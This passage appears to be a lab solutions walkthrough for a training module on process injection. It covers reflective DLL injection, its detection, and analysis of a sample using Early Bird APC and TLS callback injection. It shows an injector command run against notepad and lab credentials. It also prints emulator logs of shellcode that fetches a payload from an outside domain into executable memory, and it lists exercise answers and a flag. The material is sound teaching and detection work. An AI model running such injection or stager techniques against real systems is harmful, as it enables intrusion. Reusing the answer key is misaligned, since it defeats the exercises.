xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.72]─[htb-ac-8414@htb-91hdspk7st]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.26 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[07:36:37:206] [5861:5862] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[07:36:37:206] [5861:5862] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[07:36:37:206] [5861:5862] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[07:36:37:270] [5861:5862] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[07:36:37:270] [5861:5862] [WARN][com.freerdp.crypto] - CN = Logging-VM
[07:36:37:271] [5861:5862] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:36:37:272] [5861:5862] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[07:36:37:272] [5861:5862] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:36:37:272] [5861:5862] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.26:3389) 
[07:36:37:272] [5861:5862] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[07:36:37:272] [5861:5862] [ERROR][com.freerdp.crypto] - Common Name (CN):
[07:36:37:272] [5861:5862] [ERROR][com.freerdp.crypto] - 	Logging-VM
[07:36:37:272] [5861:5862] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.26:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  c4:b5:44:94:8f:b4:eb:e0:56:17:8d:4b:7c:e8:ae:7c:34:3a:61:8e:69:6a:7e:6e:62:27:0f:aa:14:f4:dc:5d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will use `CFF Explorer` located on the desktop and open the `reflective_dll.x64.dll` DLL file located in the `C:\injection\reflective` directory by clicking `File` > `Open`:

![[HTB Solutions/Others/z. images/966d6fa2ee2d828e0b44922cb3e6da67_MD5.jpg]]

![[HTB Solutions/Others/z. images/e996e70329868605c395d3baefdaf511_MD5.jpg]]

Next, students will navigate to the `Export Directory` to find the Dword value of the `Relative Virtual Address` (`RVA`) function:

![[HTB Solutions/Others/z. images/5a36cb5f3b8f5edb3c65f74b8a44e881_MD5.jpg]]

Answer: `00001048`

# RDLL Injection - Implementation

## Question 2

### "Explore the reflective loader to find the hardcoded hash for the LoadLibraryA() function. Submit the hash as the answer."

Students will utilize the showcased Reflective DLL Injection [repository](https://github.com/stephenfewer/ReflectiveDLLInjection) by either cloning the repository locally to their workstations or by navigating using a browser to the `ReflectiveLoader.h` header file in the `./dll/src/` directory to find the hardcoded hash for the `LOADLIBRARYA_HASH` in the definition of the constant:

![[HTB Solutions/Others/z. images/0f79371eaa4b4364764a9ee9b4df25b4_MD5.jpg]]

Answer: `0xEC0E4E8E`

# Reflective DLL Injection - Detections

## Question 1

### "Detect the Reflective DLL injection using the Get-InjectedThread PowerShell script. What is the value of Size mentioned in the output?"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.72]─[htb-ac-8414@htb-91hdspk7st]─[~]
└──╼ [★]$ xfreerdp /v:10.129.240.240 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[08:15:21:363] [64978:64979] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[08:15:21:363] [64978:64979] [WARN][com.freerdp.crypto] - CN = Logging-VM
[08:15:21:364] [64978:64979] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[08:15:21:364] [64978:64979] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[08:15:21:364] [64978:64979] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[08:15:21:364] [64978:64979] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.240.240:3389) 
[08:15:21:364] [64978:64979] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[08:15:21:364] [64978:64979] [ERROR][com.freerdp.crypto] - Common Name (CN):
[08:15:21:364] [64978:64979] [ERROR][com.freerdp.crypto] - 	Logging-VM
[08:15:21:364] [64978:64979] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.240.240:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  c4:b5:44:94:8f:b4:eb:e0:56:17:8d:4b:7c:e8:ae:7c:34:3a:61:8e:69:6a:7e:6e:62:27:0f:aa:14:f4:dc:5d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open a PowerShell terminal and start `notepad`:

Code: powershell

```powershell
& notepad
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> & notepad
```

Next, students will enumerate the processes to obtain the process id of the spawned notepad and take note of it:

Code: powershell

```powershell
ps | findstr /i notepad
```

```
PS C:\Users\Administrator> ps | findstr /i notepad
    261      14     2944      16968       0.03   5936   2 notepad
```

Students will use `inject.x64.exe` to inject the `reflective_dll.x64.dll` to the notepad process (`5936`), both located in the `C:\injection\reflective` directory:

Code: powershell

```powershell
C:\injection\reflective\inject.x64.exe <process_id> C:\injection\reflective\reflective_dll.x64.dll
```

```
PS C:\Users\Administrator> C:\injection\reflective\inject.x64.exe 5936 C:\injection\reflective\reflective_dll.x64.dll

[+] Injected the 'C:\injection\reflective\reflective_dll.x64.dll' DLL into process 5936.
```

Next, they will open another PowerShell terminal, navigate to the `C:\Tools` directory, and import the `Get-InjectedThread.ps1` PowerShell script:

Code: powershell

```powershell
cd C:\Tools
Import-Module .\Get-InjectedThread.ps1
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> Import-Module .\Get-InjectedThread.ps1
```

At last, students will invoke the `Get-InjectedThread` cmdlet to obtain the value of the `Size` parameter:

Code: powershell

```powershell
Get-InjectedThread
```

```
PS C:\Tools> Get-InjectedThread

ProcessName               : notepad.exe
ProcessId                 : 5936
Path                      : C:\Windows\system32\notepad.exe
KernelPath                : C:\Windows\System32\notepad.exe
CommandLine               : "C:\Windows\system32\notepad.exe"
PathMismatch              : False
ThreadId                  : 2284
ThreadStartTime           : 3/11/2025 8:24:33 AM
AllocatedMemoryProtection : PAGE_EXECUTE_READWRITE
MemoryProtection          : PAGE_EXECUTE_READWRITE
MemoryState               : MEM_COMMIT
MemoryType                : MEM_PRIVATE
BasePriority              : 8
IsUniqueThreadToken       : False
Integrity                 : HIGH_MANDATORY_LEVEL
Privilege                 : SeDebugPrivilege, SeChangeNotifyPrivilege, SeImpersonatePrivilege, SeCreateGlobalPrivilege
LogonId                   : 999
SecurityIdentifier        : S-1-5-21-481531802-3248398329-2133938904-500
UserName                  : LOGGING-VM\SYSTEM
LogonSessionStartTime     : 3/11/2025 7:47:21 AM
LogonType                 : System
AuthenticationPackage     : NTLM
BaseAddress               : 1695580881992
Size                      : {hidden}
Bytes                     : {72, 137, 76, 36...}
```

Answer: `69632`

# Process Injection - Skills Assessment

## Question 1

### "How many process injection techniques are used in this sample? The answer is a numeric value."

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.95]─[htb-ac-8414@htb-lymvg5zona]─[~]
└──╼ [★]$ xfreerdp /v:10.129.166.40 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[01:32:20:720] [127490:127491] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[01:32:20:720] [127490:127491] [WARN][com.freerdp.crypto] - CN = Logging-VM
[01:32:20:721] [127490:127491] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:32:20:721] [127490:127491] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[01:32:20:721] [127490:127491] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:32:20:721] [127490:127491] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.166.40:3389) 
[01:32:20:721] [127490:127491] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[01:32:20:721] [127490:127491] [ERROR][com.freerdp.crypto] - Common Name (CN):
[01:32:20:721] [127490:127491] [ERROR][com.freerdp.crypto] - 	Logging-VM
[01:32:20:721] [127490:127491] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.166.40:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  c4:b5:44:94:8f:b4:eb:e0:56:17:8d:4b:7c:e8:ae:7c:34:3a:61:8e:69:6a:7e:6e:62:27:0f:aa:14:f4:dc:5d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Next, students will use `IDA Freeware 8.4` to disassemble the `project.exe` executable located in the `C:\injection\exercises\assessment` directory:

![[HTB Solutions/Others/z. images/3fca043bc88048af4d6759913381eb5f_MD5.jpg]]

![[HTB Solutions/Others/z. images/cd7c711b50d9b43d712dd0b259107cea_MD5.jpg]]

![[HTB Solutions/Others/z. images/17b1b29a07c757d0dcfaf19e66cdd2a6_MD5.jpg]]

Students will be asked to specify the path of a symbol file name found by IDA where they will choose the `No` option:

![[HTB Solutions/Others/z. images/9e8fc237afe86b82e3092ec79c7cd518_MD5.jpg]]

Students will be presented with the disassembly view (IDA View-A) in a graph-like style, aiding in analyzing the binary (executable) file. Within the view, students will observe the different function calls and paths to executable files such as `CreateProcessA`, `VirtualAllocEx`, `WriteProcessMemory`, `VirtualProtectEx`, `QueueUserAPC`, `VirtualFreeEx`, `ResumeThread`, `CloseHandle`, and `MessageBoxW` and note them down.

![[HTB Solutions/Others/z. images/23aba24c8fcebfe66781c63c6baf9a9f_MD5.jpg]]

Due to the presence of the `VirtualAllocEx`, `WriteProcessMemory`, `VirtualFreeEx`, `QueueUserAPC`, `ResumeThread`, and `CloseHandle` functions, students will understand the first process injection technique used in the sample, is related to the `Asynchronous Procedure Calls` known as the `Early Bird APC Queue Injection` technique.

Subsequently, students will move to the `Exports` tab of IDA to find the `TlsCallback_0` export name indicating a `TLS Callback Injection` which runs before the entry point of the program.

![[HTB Solutions/Others/z. images/c94ff6cf213a8972ce53fab550266c61_MD5.jpg]]

Alternatively, students can use the `CTRL + E` shortcut to display the entry point list of the program from the `IDA View-A` tab.

![[HTB Solutions/Others/z. images/1a276d67e5f827870db7c83d0cbd4799_MD5.jpg]]

To further validate the finding of the TLS Callback injection, students will use `PE-bear.exe` located in `C:\Tools\PE-bear`. Once they have started the program, students will go to `File` > `Load PEs` and navigate to `C:\injection\exercises\assessment` and load the `project.exe` executable:

![[HTB Solutions/Others/z. images/d8b12ba242cfb31d96c8dfe72505f021_MD5.jpg]]

![[HTB Solutions/Others/z. images/190808a540e048d98346d340dbef0819_MD5.jpg]]

Students will navigate to the `TLS` tab to locate the address of the `AddressOfCallbacks` function, and the specific address of the TLS callback function entry:

![[HTB Solutions/Others/z. images/019b751d816635f30796390407835647_MD5.jpg]]

Students would have found the number of process injection techniques in the sample.

Answer: `2`

# Process Injection - Skills Assessment

## Question 2

### "What is the name of the domain found in the shellcode originating from the main function of the program?"

Students will open `x64dbg` and load the `project.exe` executable to begin debugging and analyzing the behavior of the executable.

![[HTB Solutions/Others/z. images/935c6eb9330fd4b3d7dfaed6a4d88789_MD5.jpg]]

![[HTB Solutions/Others/z. images/438bd594999b1914265b936272492b05_MD5.jpg]]

Right after loading the binary in the debugger, students will go to the `Symbols` tab, select the `kernel32.dll` module, and search for the `WriteProcessMemory` function to set a breakpoint:

![[HTB Solutions/Others/z. images/08eba273124d48233287d78913f3a02c_MD5.jpg]]

Next, students will run the program until the `WriteProcessMemory` breakpoint is reached:

![[HTB Solutions/Others/z. images/47113916d2a090e1be9f8ab509a8d159_MD5.jpg]]

Now, students will observe the registers in the stack (`FPU` window) and take note of them. The [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) function will write data to an area of memory in the specified process; being a boolean function, it will check if the area is accessible to write the bytes. Otherwise, it will fail. Students will recall the [x64 calling convention](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170), where each parameter corresponds to a different register. As the third parameter in the `WriteProcessMemory` function is `lpBuffer` and is a pointer to the buffer that holds the data to be written in the specific process, the calling convention of the registers in the function would be the following:

Code: c

```c
BOOL WriteProcessMemory( 
	[in] HANDLE hProcess, // --> RCX register
	[in] LPVOID lpBaseAddress, // --> RDX register
	[in] LPCVOID lpBuffer, // --> R8 register
	[in] SIZE_T nSize, // --> R9 register
	[out] SIZE_T *lpNumberOfBytesWritten // Stack
);
```

Since the `lpBuffer` holds the data (shellcode), students will right-click on the `R8` register in the `FPU` window and click on `Follow in Dump`:

![[HTB Solutions/Others/z. images/26135c052981dd139567948025e1db9d_MD5.jpg]]

Students will notice readable strings in the ASCII column, such as the user agent, in the memory dump window. Subsequently, students will select the shellcode bytes starting from the `FC 48` bytes to the `FF D5` ending bytes, and right-click `Binary` > `Save To a File` to save the shellcode in a file on the Desktop:

![[HTB Solutions/Others/z. images/b79f7b4b1ae146bdd6816f4a17e0eb15_MD5.jpg]]

![[HTB Solutions/Others/z. images/e72d549f9186a6766b33a676af6c58a6_MD5.jpg]]

Students will open Command Prompt, navigate to the `Desktop`, and use `speakeasy` to analyze the shellcode and find the use of the `LoadLibraryA` function to load the `wininet` library and notice in the second parameter the domain used in the [InternetConnectionA](https://learn.microsoft.com/en-us/windows/win32/api/Wininet/nf-wininet-internetconnecta) function:

Code: cmd

```cmd
cd Desktop\
speakeasy -t first-shellcode.bin -r -a x64
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd Desktop\

C:\Users\Administrator\Desktop>speakeasy -t first-shellcode.bin -r -a x64

* exec: shellcode
0x10f3: 'kernel32.LoadLibraryA("wininet")' -> 0x7bc00000
0x1188: 'wininet.InternetOpenA("Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15", 0x0, 0x0, 0x0, 0x0)' -> 0x20
0x11bc: 'wininet.InternetConnectA(0x20, "{hidden}", 0x115c, 0x0, 0x0, 0x3, 0x0, 0x0)' -> 0x24
0x1215: 'wininet.HttpOpenRequestA(0x24, 0x0, "/hi1E4qUUT4BE8kXwI0EIDwtBzVqJHgRxTs15LzE6ratdYEPyI", 0x0, 0x0, 0x0, "INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE", 0x0)' -> 0x28
0x123a: 'wininet.InternetSetOptionA(0x28, 0x1f, 0x1203eb0, 0x4)' -> 0x1
0x1253: 'wininet.HttpSendRequestA(0x28, 0x0, 0x0, 0x0, 0x0)' -> 0x1
0x1294: 'kernel32.VirtualAlloc(0x0, 0x400000, 0x1000, "PAGE_EXECUTE_READWRITE")' -> 0x450000
0x12b7: 'wininet.InternetReadFile(0x28, 0x450000, 0x2000, 0x1203e30)' -> 0x1
0x12b7: 'wininet.InternetReadFile(0x28, 0x451000, 0x2000, 0x1203e30)' -> 0x1
0x450012: Unhandled interrupt: intnum=0x3
0x450012: shellcode: Caught error: unhandled_interrupt
* Finished emulating
```

Answer: `airbusocean.com`

# Process Injection - Skills Assessment

## Question 3

### "Another injection technique is used to inject a different shellcode. Identify the domain name contained in the shellcode that originates from a function other than the main function. Type the domain name as your answer."

As students have found the `Early Bird APC Queue Injection` technique used in the sample, students will return to `x64dbg` and run the program until the `WriteProcessMemory` function is reached again since the technique utilizes the function. Note, students may be required to run until the second shellcode is loaded into memory, e.g., reaching the breakpoint on the third time.

![[HTB Solutions/Others/z. images/caaace5a04463479d5e3d1a4cd728211_MD5.jpg]]

Again, students will refer to the `x64 calling convention` and will focus on the `R8` register, right-click on it, and `Follow in Dump`:

![[HTB Solutions/Others/z. images/81be42c9ee3b832b962651432ac1feac_MD5.jpg]]

Students will select the `FC 48` bytes until the `FF D5` ending bytes, and right-click `Binary` > `Save To a File` to save the shellcode in a file on the Desktop:

![[HTB Solutions/Others/z. images/4ab8ef4a817693b4f902a364e687405a_MD5.jpg]]

![[HTB Solutions/Others/z. images/5b8e423495cdb59343088ff6f7aff153_MD5.jpg]]

Students will return to the previously spawned Command Prompt, and use `speakeasy` to analyze the shellcode and find the domain name used in the `InternetConnectA` function of the `wininet` library:

Code: cmd

```cmd
speakeasy -t second-shellcode.bin -r -a x64
```

```
C:\Users\Administrator\Desktop>speakeasy -t second-shellcode.bin -r -a x64

* exec: shellcode
0x10f3: 'kernel32.LoadLibraryA("wininet")' -> 0x7bc00000
0x1188: 'wininet.InternetOpenA("Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15", 0x0, 0x0, 0x0, 0x0)' -> 0x20
0x11bc: 'wininet.InternetConnectA(0x20, "{hidden}", 0x115c, 0x0, 0x0, 0x3, 0x0, 0x0)' -> 0x24
0x1215: 'wininet.HttpOpenRequestA(0x24, 0x0, "/hi1E4qUUT4BE8kXwI0EIDwtBzVqJHgRxTs15LzE6ratdYEPyI", 0x0, 0x0, 0x0, "INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE", 0x0)' -> 0x28
0x123a: 'wininet.InternetSetOptionA(0x28, 0x1f, 0x1203eb0, 0x4)' -> 0x1
0x1253: 'wininet.HttpSendRequestA(0x28, 0x0, 0x0, 0x0, 0x0)' -> 0x1
0x1294: 'kernel32.VirtualAlloc(0x0, 0x400000, 0x1000, "PAGE_EXECUTE_READWRITE")' -> 0x450000
0x12b7: 'wininet.InternetReadFile(0x28, 0x450000, 0x2000, 0x1203e30)' -> 0x1
0x12b7: 'wininet.InternetReadFile(0x28, 0x451000, 0x2000, 0x1203e30)' -> 0x1
0x450012: Unhandled interrupt: intnum=0x3
0x450012: shellcode: Caught error: unhandled_interrupt
* Finished emulating
```

Answer: `airbusocean.com`

# Process Injection - Skills Assessment

## Question 4

### "What is the name of the child process on which Early Bird APC injection is performed?"

Students will open Event Viewer, navigate to `Application and Services Logs` > `Sealighter` > `Operational`, and are going to use the `Find` feature to look for an event related to the `QueueUserAPC` string (function):

![[HTB Solutions/Others/z. images/9e936a4fb343dbe0223e5ef02b7e968a_MD5.jpg]]

Within the found event, students will take note of the `TargetProcessId` value (`4236`):

![[HTB Solutions/Others/z. images/05684c219acd6caed51fd891d3e30c1b_MD5.jpg]]

Next, students will navigate to the Sysmon logs: `Application and Services` > `Microsoft` > `Windows` > `Sysmon` > `Operational`. Subsequently, they will use the `Filter Current Log...` feature to filter for `Sysmon Event ID 1` (`ProcessCreate`) events and use the `Find` feature to look for events related to the process id found earlier (`4236`):

![[HTB Solutions/Others/z. images/1d094c522dc274aad7d8f129809b0749_MD5.jpg]]

![[HTB Solutions/Others/z. images/c723885d112bcd66be337436e083661f_MD5.jpg]]

Students will come across an event where the `project.exe` executable was used to spawn another non-standard executable:

![[HTB Solutions/Others/z. images/baca266f861e32a08457165d13725728_MD5.jpg]]

Answer: `hh.exe`

# Process Injection - Skills Assessment

## Question 5

### "Type the final flag as your answer. The answer Format is FLAG{...}"

Students will return to `IDA` and go to the `Exports` tab, where they will double-click on the `TlsCallback_0` function to analyze it:

![[HTB Solutions/Others/z. images/5c17a4b7508e1ef275b583d57a6f5a0e_MD5.jpg]]

Students will notice strings related to various text files and note them down:

![[HTB Solutions/Others/z. images/8a0b781a514c09e6c55b19708bf1d9d9_MD5.jpg]]

By further analyzing the flow of the function, students will find a reference to the `C:\Windows\Temp` directory:

![[HTB Solutions/Others/z. images/ad94c9cb450c7287abe514f506c35e9b_MD5.jpg]]

Students will reach almost the end of the function to find a reference to the [CreateFileW](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew) function alongside the file's location and name in the `RCX` register (`lpFileName` parameter) and note it down.

![[HTB Solutions/Others/z. images/a941749b8485a9567f408f452b3506d3_MD5.jpg]]

Subsequently, students will return to the previously spawned Command Prompt terminal and will query the contents of the text files within the found directory (`C:\Windows\Temp`) to find a Base64 encoded string and take note of it:

Code: cmd

```cmd
type C:\Windows\Temp\*.txt
```

```
C:\Users\Administrator\Desktop>type C:\Windows\Temp\*.txt

C:\Windows\Temp\audit_log.txt

In the middle of every difficulty lies opportunity.
C:\Windows\Temp\config_backup.txt

Happiness depends upon ourselves.
C:\Windows\Temp\error_report.txt

The journey of a thousand miles begins with a single step.
C:\Windows\Temp\event_record.txt

Do what you can, with what you have, where you are.
C:\Windows\Temp\network_scan.txt

If you can dream it, you can do it.
C:\Windows\Temp\security_notes.txt

Do what you can, with what you have, where you are.
C:\Windows\Temp\session_data.txt

Believe you can and you're halfway there.
C:\Windows\Temp\system_log.txt

RkxBR3tBUENfUXUzdTNE
C:\Windows\Temp\update_patch.txt

Believe you can and you're halfway there.
C:\Windows\Temp\user_cache.txt

Believe you can and you're halfway there.
```

Next, students will query the contents of the hardcoded `.dat` file to find another Base64 encoded string to note down:

Code: cmd

```cmd
type C:\Windows\Temp\ChromeReprompt.dat
```

```
C:\Users\Administrator\Desktop>type C:\Windows\Temp\ChromeReprompt.dat
X2J1dF9mMHJfd2gwP30=
```

At last, students will return to their workstations, open a terminal and decode the found Base64 strings to obtain the flag:

```shell
echo RkxBR3tBUENfUXUzdTNEX2J1dF9mMHJfd2gwP30= | base64 -d
```
```
┌─[eu-academy-5]─[10.10.14.95]─[htb-ac-8414@htb-x8bncdy8g8]─[~]
└──╼ [★]$ echo RkxBR3tBUENfUXUzdTNEX2J1dF9mMHJfd2gwP30= | base64 -d

{hidden}
```

Answer: `FLAG{APC_Qu3u3D_but_f0r_wh0?}`